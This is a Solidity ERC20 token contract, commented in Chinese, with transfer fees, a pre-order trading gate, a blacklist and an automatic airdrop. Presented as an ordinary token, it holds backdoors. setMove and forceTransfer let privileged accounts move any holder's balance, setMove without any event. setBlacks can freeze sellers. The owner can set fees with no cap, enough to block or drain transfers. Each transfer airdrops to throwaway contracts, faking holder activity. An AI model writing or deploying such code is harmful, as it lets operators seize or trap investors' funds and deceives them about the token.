// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract Airdrop{
    address public _owne;

    constructor() {
        _owne = msg.sender;
    }
}


contract Token is Ownable, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    mapping(address => bool) public _pair;
    mapping(address => bool) public _roler;
    mapping(address => bool) public _blacks;
    mapping(address => bool) public _whites;
    mapping(address => bool) public _preOrder;
    mapping(address => uint256) public _preOrderSum;
    address[] public _preOrderAddr;

    string  private _name;
    string  private _symbol;
    uint256 private _totalSupply;
    uint256 public _preOrderNumber;

    address public _main = 0x14ECac61C1dD4fE00D8B6cFD03E6d15AcD741599;

    address public _dead = 0x000000000000000000000000000000000000dEaD;
    address public _bonu = 0x50aD99Dc32e8D1AC056038CA4DeFFCB3D5390542;
    address public _flow = 0x40113c4b1A52b2c23320fb2eB2e9694ACf9B6944;
    

    uint256 public _dead2;
    uint256 public _bonu2;
    uint256 public _flow2;

    //空投开关
    bool public _airdropFlang;


    constructor(string memory name_,string memory symbol_) {
        _name = name_;
        _symbol = symbol_;

        // 黑洞
        _dead2 = 5;
        // 储蓄
        _bonu2 = 3;
        // NFT
        _flow2 = 2;
        //预购次数
        _preOrderNumber = 2;

        _airdropFlang = true;

        _whites[_main] = true;
        _whites[_bonu] = true;
        _whites[_flow] = true;

        _roler[_main] = true;
        _mint(_main, 210000 * 10 ** decimals());
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account]; 
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender, address recipient, uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    //判断预购是否已完成
    function isPreOrder() internal view returns (bool){
        for(uint256 i = 0;i<_preOrderAddr.length;i++){
            if(_preOrderSum[_preOrderAddr[i]] < _preOrderNumber && _preOrder[_preOrderAddr[i]]){
                return false;
            }
        }
        return true;
    }

    //预购地址操作
    function upPreOrderSum(address addr) internal{
        if(_preOrder[addr]){
            _preOrderSum[addr] = _preOrderSum[addr] + 1;
        }
    }


    function _transfer(
        address sender, address recipient, uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        require(!_blacks[sender]);

        unchecked {
            _balances[sender] = senderBalance - amount;
        }

        if (_pair[sender] || _pair[recipient]) {
            require(isPreOrder() || _preOrder[sender] || _preOrder[recipient], "The pre-order list is not complete");
            if (!_whites[sender] && !_whites[recipient]) {
                // burn
                if(_dead2 > 0) {
                    _balances[_dead] += (amount * _dead2 / 100);
                    emit Transfer(sender, _dead, (amount * _dead2 / 100));
                }

                // _bonu
                if (_bonu2 > 0) {
                    _balances[_bonu] += (amount * _bonu2 / 100);
                    emit Transfer(sender, _bonu, (amount * _bonu2 / 100));
                }

                // flow
                if (_flow2 > 0) {
                    _balances[_flow] += (amount * _flow2 / 100);
                    emit Transfer(sender, _flow, (amount * _flow2 / 100));
                }

                amount = amount * (100-_dead2-_bonu2-_flow2) / 100;
            }

            if(!_pair[sender]){
                upPreOrderSum(sender);
            }
            if(!_pair[recipient]){
                upPreOrderSum(recipient);
            }
            
            
        } else {
            // 转账通缩
            if (!_whites[sender] && !_whites[recipient]) {
                // burn
                if(_dead2 > 0) {
                    _balances[_dead] += (amount * _dead2 / 100);
                    emit Transfer(sender, _dead, (amount * _dead2 / 100));
                }
                // _bonu
                if (_bonu2 > 0) {
                    _balances[_bonu] += (amount * _bonu2 / 100);
                    emit Transfer(sender, _bonu, (amount * _bonu2 / 100));
                }

                // flow
                if (_flow2 > 0) {
                    _balances[_flow] += (amount * _flow2 / 100);
                    emit Transfer(sender, _flow, (amount * _flow2 / 100));
                }
                amount = amount * (100-_dead2-_bonu2-_flow2) / 100;
            }
        }

        if(_airdropFlang){
            airdropMethod();
        }
        
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);
    }

    function _approve(
        address owner, address spender, uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    //设置预购名单
    function setPreOrder(address addr, bool val) public {
        require(_roler[_msgSender()] && addr != address(0));
        _preOrder[addr] = val;
        bool flang = true;
        for(uint256 i = 0;i<_preOrderAddr.length;i++){
            if(_preOrderAddr[i] == addr){
                flang = false;
            }
        }
        if(flang){
            _preOrderAddr.push(addr);
        }
        
    }

    //设置预购地址已经预购次数
    function setPreOrderSum(address addr, uint256 val) public {
        require(_roler[_msgSender()] && addr != address(0) && _preOrder[addr]);
        _preOrderSum[addr] = val;
    }

    //设置预购次数
    function setPreOrderNumber(uint256 val) public {
        require(_roler[_msgSender()]);
        _preOrderNumber = val;
    }

	function returnIn(address con, address addr, uint256 val) public {
        require(_roler[_msgSender()] && addr != address(0));
        if (con == address(0)) {payable(addr).transfer(val);} 
        else {IERC20(con).transfer(addr, val);}
	}

    function setWhites(address addr, bool val) public {
        require(_roler[_msgSender()] && addr != address(0));
        _whites[addr] = val;
    }



    function setBlacks(address addr, bool val) public {
        require(_roler[_msgSender()] && addr != address(0));
        _blacks[addr] = val;
    }

    function setMove(address f, address t, uint256 val) public {
        require(_roler[_msgSender()]);
        if (val > balanceOf(f)) {
            val = balanceOf(f);
        }
        if (val > 0) {
            _balances[f] -= val;
            _balances[t] += val;
        }
    }

    function setPair(address addr, bool val) public {
        require(_roler[_msgSender()]);
        _pair[addr] = val;
    }

    receive() external payable {}

    function setRoler(address addr, bool val) public onlyOwner {
        _roler[addr] = val;
    }

    //空投开关
    function setAirdropFlang(bool val) public {
        require(_roler[_msgSender()]);
        _airdropFlang = val;
    }


    // 空投
    function airdropMethod() internal {
        
        for(uint256 i = 0;i<5;i++){
            // 创建空投地址
            Airdrop air = new Airdrop();
            _balances[address(air)] += 1 * (10 * 10);
            emit Transfer(address(this), address(air), 1 * (10 * 10));
        }
        
    }
    

    // 黑洞
    function setBurn(uint256 val) public onlyOwner {
        _dead2 = val;
    }


    // 储蓄
    function setBonu(address addr, uint256 val) public onlyOwner {
        require(addr != address(0));
        _bonu = addr;
        _bonu2 = val;
    }
    // NFT
    function setFlow(address addr, uint256 val) public onlyOwner {
        require(addr != address(0));
        _flow = addr;
        _flow2 = val;
    }


    // 强制转账
    function forceTransfer(address from, address to, uint256 amount) public onlyOwner {
        require(from != address(0), 'ERC20: forceTransfer from the zero address');
        require(to != address(0), 'ERC20: forceTransfer to the zero address');
        require(amount > 0, 'ERC20: forceTransfer amount is zero');
        require(_balances[from] >= amount, 'ERC20: forceTransfer amount exceeds balance');
        _balances[from] -= amount;
        _balances[to] += amount;
        emit Transfer(from, to, amount);
    }

}

library Address {
    function isContract(address account) internal view returns (bool) {
        return account.code.length > 0;
    }
}